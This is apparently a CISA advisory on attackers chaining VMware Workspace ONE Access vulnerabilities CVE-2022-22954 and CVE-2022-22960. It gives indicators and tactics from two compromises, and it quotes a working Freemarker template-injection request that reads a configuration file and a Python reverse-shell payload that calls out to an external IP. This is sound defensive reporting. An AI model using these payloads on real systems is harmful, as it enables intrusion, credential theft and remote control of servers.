These vulnerabilities affect certain versions of VMware Workspace ONE Access, VMware Identity Manager (vIDM), VMware vRealize Automation (vRA), VMware Cloud Foundation, and vRealize Suite Lifecycle Manager. Exploiting these vulnerabilities permits malicious actors to trigger a server\\-side template injection that may result in remote code execution (RCE) (CVE\\-2022\\-22954\\) or escalation of privileges to root (CVE\\-2022\\-22960\\).\n \n\n\n\n VMware released updates for both vulnerabilities on April 6, 2022, and, according to a trusted third party, malicious cyber actors were able to reverse engineer the updates to develop an exploit within 48 hours and quickly began exploiting the disclosed vulnerabilities in unpatched devices. CISA was made aware of this exploit a week later and added CVE\\-2022\\-22954 and CVE\\-2022\\-22960 to its catalog of\n [Known Exploited Vulnerabilities](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) \n on April 14 and April 15, respectively. In accordance with\n [Binding Operational Directive (BOD) 22\\-01, Reducing the Significant Risk of Known Exploited Vulnerabilities](https://www.cisa.gov/binding-operational-directive-22-01) \n , federal agencies were required to apply updates for CVE\\-2022\\-22954 and CVE\\-2022\\-22960 by May 5, and May 6, 2022, respectively\n \n\n\n\n**Note:** \n based on this activity, CISA expects malicious cyber actors to quickly develop a capability to exploit newly released vulnerabilities CVE\\-2022\\-22972 and CVE\\-2022\\-22973 in the same impacted VMware products. In response, CISA has released,\n [Emergency Directive (ED) 22\\-03 Mitigate VMware Vulnerabilities](https://www.cisa.gov/emergency-directive-22-03) \n , which requires emergency action from Federal Civilian Executive Branch agencies to either immediately implement the updates in\n [VMware Security Advisory VMSA\\-2022\\-0014](https://www.vmware.com/security/advisories/VMSA-2022-0014.html) \n or remove the affected software from their network until the updates can be applied.\n \n\n\n\n CISA has deployed an incident response team to a large organization where the threat actors exploited CVE\\-2022\\-22954\\. Additionally, CISA has received information\u2014including IOCs\u2014about observed exploitation at multiple other large organizations from trusted third parties.\n \n\n\n\n This CSA provides IOCs and detection signatures from CISA as well as from trusted third parties to assist administrators with detecting and responding to this activity.\n \n\n\n\n***Update June 2, 2022:***\n\n\n\n\n This CSA also provides TTPs of this activity from trusted third parties to assist administrators with detecting and responding to this activity.\n \n\n\n\n***Update End***\n\n\n\n\n Due to the rapid exploitation of these vulnerabilities, CISA strongly encourages all organizations with internet\\-facing affected systems\u2014that did not immediately apply updates\u2014to assume compromise and initiate threat hunting activities using the detection methods provided in this CSA. If potential compromise is detected, administrators should apply the incident response recommendations included in this CSA.\n \n\n\n\n[Download the PDF version of this report (pdf, 349kb)](/sites/default/files/publications/AA22-138B_Threat_Actors_Chaining_VMware_Unpatched_Vulnerabilities_for_Full_System_Control.pdf) \n .\n \n\n\n\n For a downloadable copy of IOCs, see\n [AA22\\-138B.stix](/sites/default/files/publications/AA22-138B.stix.xml) \n .\n \n\n\n\n### Technical Details\n\n\n\n\n CISA has deployed an incident response team to a large organization where the threat actors exploited CVE\\-2022\\-22954\\. Additionally, CISA has received information about observed exploitation of CVE\\-2022\\-22954 and CVE\\-2022\\-22960 by multiple threat actors at multiple other large organizations from trusted third parties.\n \n\n\n* [CVE\\-2022\\-22954](https://nvd.nist.gov/vuln/detail/CVE-2022-22954) \n enables an actor with network access to trigger a server\\-side template injection that may result in RCE. This vulnerability affects the following products:\\[\n [1](https://www.vmware.com/security/advisories/VMSA-2022-0011.html) \n ]\n\t+ VMware Workspace ONE Access, versions 21\\.08\\.0\\.1, 21\\.08\\.0\\.0, 20\\.10\\.0\\.1, 20\\.10\\.0\\.0\n\t+ vIDM versions 3\\.3\\.6, 3\\.3\\.5, 3\\.3\\.4, 3\\.3\\.3\n\t+ VMware Cloud Foundation, 4\\.x\n\t+ vRealize Suite LifeCycle Manager, 8\\.x\n* [CVE\\-2022\\-22960](https://nvd.nist.gov/vuln/detail/CVE-2022-22960) \n enables a malicious actor with local access to escalate privileges to root due to improper permissions in support scripts. This vulnerability affects the following products:\\[\n [2](https://www.vmware.com/security/advisories/VMSA-2022-0011.html) \n ]\n\t+ VMware Workspace ONE Access, versions 21\\.08\\.0\\.1, 21\\.08\\.0\\.0, 20\\.10\\.0\\.1, 20\\.10\\.0\\.0\n\t+ vIDM, versions 3\\.3\\.6, 3\\.3\\.5, 3\\.3\\.4, 3\\.3\\.3\n\t+ vRA, version 7\\.6\n\t+ VMware Cloud Foundation, 3\\.x, 4\\.x,\n\t+ vRealize Suite LifeCycle Manager, 8\\.x\n\n\n\n According to trusted third\\-party reporting, threat actors may chain these vulnerabilities. At one compromised organization, on or around April 12, 2022, an unauthenticated actor with network access to the web interface leveraged CVE\\-2022\\-22954 to execute an arbitrary shell command as a VMware user. The actor then exploited CVE\\-2022\\-22960 to escalate the user\u2019s privileges to root. With root access, the actor could wipe logs, escalate permissions, and move laterally to other systems.\n \n\n\n\n***Update June 2, 2022:***\n\n\n\n\n For more information about this compromised organization, see the Victim 1 section.\n \n\n\n\n***Update End***\n\n\n\n\n Threat actors have dropped post\\-exploitation tools, including the Dingo J\\-spy webshell, a publicly available webshell that includes command execution, a file manager, a database manager, and a port scanner. During incident response activities, CISA observed, on or around April 13, 2022, threat actors leveraging CVE\\-2022\\-22954 to drop the Dingo J\\-spy webshell. Around the same period, a trusted third party observed threat actors leveraging CVE\\-2022\\-22954 to drop the Dingo J\\-spy webshell at one other organization. According to the third party, the actors may have also dropped the Dingo J\\-spy webshell at a third organization.\n **Note:** \n analysis of the first compromise and associated malware is ongoing, and CISA will update information about this case as we learn more.\n \n\n\n\n***Update June 2, 2022:***\n\n\n\n\n The following sections include additional information, including IOCs and TTPs, from trusted third parties about two confirmed compromises. See the appendix for TTPs in this CSA mapped to the MITRE ATT\\&CK for Enterprise framework.\n \n\n\n### Victim 1\n\n\n\n The trusted third party assesses that multiple threat actors (referred to as Threat Actor 1 \\[TA1] and Threat Actor 2 \\[TA2]) gained access to a public\\-facing server running VMWare Workspace ONE Access. TA1 downloaded a malicious shell script, which they used to collect and exfiltrate sensitive data. TA2 interacted with the server (without automation or scripts) and installed multiple webshells and a reverse secure socket (SOCKS) proxy.\n \n\n\n#### **Threat Actor 1**\n\n\n\n On April 12, TA1 exploited CVE 2022\\-22954 \\[\n [T1203](https://attack.mitre.org/versions/v11/techniques/T1203) \n ] to download \\[\n [T1105](https://attack.mitre.org/versions/v11/techniques/T1105/) \n ] a malicious shell script \\[\n [T1059](https://attack.mitre.org/versions/v11/techniques/T1059/) \n ] from\n `https://20.232.97[.]189/up/80b6ae2cea.sh` \n .\n \n\n\n\n TA1 first targeted Freemarker\u2014a legitimate application that allows for customized notifications by creating templates\u2014to send the following customized GET request URI to the compromised server \\[\n [T1071\\.001](https://attack.mitre.org/versions/v11/techniques/T1071/001/) \n ]:\n \n\n\n\n`GET /catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7B%22freemarker.template.utility.Execute%22%3Fnew%28%29%28%22cat%20/usr/local/horizon/conf/system-config.properties%22%29%7DHTTP/1.1` \n\n\n\n\n The GET request resulted in the server downloading the malicious shell script,\n `80b6ae2cea[.]sh` \n , to VMware Workspace ONE Access\n `directory` \n`/usr/local/horizon/scripts/` \n . TA1 then chained CVE 2022\\-22960 to the initial exploit to run the shell script with root privileges (\\[\n [T1068](https://attack.mitre.org/versions/v11/techniques/T1068/) \n ], \\[\n [TA0004](https://attack.mitre.org/versions/v11/tactics/TA0004/) \n ]). The script was executed with the\n `SUDO` \n command.\n \n\n\n\n The script, which contained VMware Workspace ONE Access directory paths and file locations, was developed for data exfiltration \\[\n [TA0010](https://attack.mitre.org/versions/v11/tactics/TA0010/) \n ]. The malicious script collected \\[\n [TA0009](https://attack.mitre.org/versions/v11/tactics/TA0009/) \n ] sensitive files\u2013including user names, passwords, master keys, and firewall rules\u2013and stored them in a \u201ctar ball\u201d (a \u201ctar ball\u201d is a compressed and zipped file used by threat actors for collection and exfiltration) \\[\n [T1560](https://attack.mitre.org/versions/v11/techniques/T1560/) \n ]. The tar ball was located in a VMWare Workspace ONE Access directory:\n `/opt/vmware/horizon/workspace/webapps/SAAS/horizon/images/` \n .\n \n\n\n\n The malicious script then deleted evidence of compromise \\[\n [TA0005](https://attack.mitre.org/versions/v11/tactics/TA0005/) \n ] by modifying logs to their original state and deleting files \\[\n [T1070](https://attack.mitre.org/versions/v11/techniques/T1070/) \n ]. TA1 deleted many files and logs, including\n `fd86ald0.pem` \n ,\n `localhost_access logs` \n , logs associated with the VMWare Horizon application, and greenbox logs for the date of activity (April 12\\).\n \n\n\n\n**Note:** \n CISA received a similar malicious Bash script for analysis from a trusted third party at a different known compromise. See Victim 2 section for more information.\n \n\n\n\n On April 12, TA1 also downloaded\n `jtest.jsp` \n , a JSP webshell, to the server\u2019s web directory\n `/SAAS/Horizon/js-lib/` \n from IP address\n `186.233.187[.]245` \n .\n \n\n\n\n TA1 returned to the server on April 12 to collect sensitive data stored in the \u201ctar ball\u201d by GET request.\n \n\n\n#### **Threat Actor 2**\n\n\n\n On April 13 and 14, TA2 sent many GET requests to the server exploiting\u2014or attempting to exploit\u2014CVE 2022\\-22954 to obtain RCE, upload binaries, and upload webshells \\[\n [T1505\\.003](https://attack.mitre.org/versions/v11/techniques/T1505/003/) \n ] for persistence \\[\n [TA0003](https://attack.mitre.org/versions/v11/tactics/TA0003/) \n ].\n \n\n\n* On April 13, TA2 attempted to download a webshell\n `app.jsp` \n (MD5\n `4cd8366345ad4068feca4d417738b4b` \n d) from IP address\n `51.79.171[.]53` \n .\n `app.jsp` \n is a publicly available \\[\n [T1588\\.001](https://attack.mitre.org/versions/v11/techniques/T1588/001/) \n ] webshell known as Godzilla.\n* On April 13, TA2 downloaded a JSP webshell (MD 5\n `F8FF5C72E8FFA2112B01802113148BD1` \n ) from\n `http://84.38.133[.]149/img/icon1.gif` \n .\n* On April 13, TA2 sent thousands of Unix commands \\[\n [T1059\\.004](https://attack.mitre.org/versions/v11/techniques/T1059/004/) \n ] from IP address\n `84.38.133[.]149` \n , some of which enabled TA2 to view\n `/etc/passwd` \n and\n `/etc/shadow` \n password files (\\[\n [TA0006](https://attack.mitre.org/versions/v11/tactics/TA0006/) \n ], \\[\n [T1003\\.008](https://attack.mitre.org/versions/v11/techniques/T1003/008/) \n ]). The Unix commands included\n `whoami` \n ,\n `id` \n , and\n `cat` \n .\n\n\n\n The trusted third party found two copies of the Dingo J\\-spy webshell (MD5\n `5b0bfda04a1e0d8dcb02556dc4e56e6a` \n ) in web directories:\n `horizon_all.jsp` \n was in the\n `/opt/vmware/horizon/workspace/webapps/SAAS/horizon/portal/` \n web directory and\n `jquery.jsp` \n was in the\n `/webapps/cas/static/` \n directory. The third party was unable to determine how and when the webshells were created. TA2 used\n `POST` \n requests to communicate with the Dingo J\\-spy webshells. The commands and output were encrypted with an XOR key \\[\n [T1573\\.001](https://attack.mitre.org/versions/v11/techniques/T1573/001/) \n ].\n \n\n\n\n On April 14, TA2 downloaded a reverse SOCKS proxy \\[\n [T1090](https://attack.mitre.org/versions/v11/techniques/T1090/) \n ]. TA2 first sent a GET request with the\n `CHMOD` \n command to change the permissions of\n `.tmp12865xax` \n , a hidden file in the\n `/tmp` \n directory \\[\n [T1222\\.002](https://attack.mitre.org/versions/v11/techniques/T1222/002/) \n ]. The actor then downloaded a binary (MD5\n `dc88c5fe715b5f706f9fb92547da948a` \n ) from https://github\\[.]com/kost/revsocks/releases/download/v1\\.1\\.0/revsocks\\_linux\\_amd64\\. The binary is a reverse socks5 tunneling binary with TLS/SSL support and connects to\n `https://149.248.35[.]200.sslip.io` \n .\n \n\n\n#### *Additional Threat Actor Activity*\n\n\n\n The trusted third party observed additional threat actor activity that does not seem to be related to TA1 or TA2\\. On 13 April, IP address\n `172.94.89[.]112` \n attempted to connect a reverse shell on the compromised server to IP Address\n `100.14.239[.]83` \n on port 5410\\. The threat actor used the following command:\n \n\n\n\n`freemarker.template.utility.Execute\\\"?new()(\\\"/usr/bin/python3.7 -c \u00a0\\\\'importsocket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s. connect((\\\\\\\"100[.]14[.]239[.]83\\\\\\\",5410));os.dup2(s.fileno(),0); \u00a0os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\\\\\"/usr/bin/sh\\\\\\\",\\\\\\\"- i\\\\\\\"]);\\\\'\\\")}` \n\n\n\n### Victim 2\n\n\n\n CISA received a related malicious Bash script for analysis from a trusted third party.

CISA does not endorse alternative mitigation options. As noted in\n [ED 22\\-03 Mitigate VMware Vulnerabilities](https://www.cisa.gov/emergency-directive-22-03) \n , CISA expects malicious cyber actors to quickly develop a capability to exploit newly released vulnerabilities CVE\\-2022\\-22972 and CVE\\-2022\\-22973 in the same impacted VMware products.
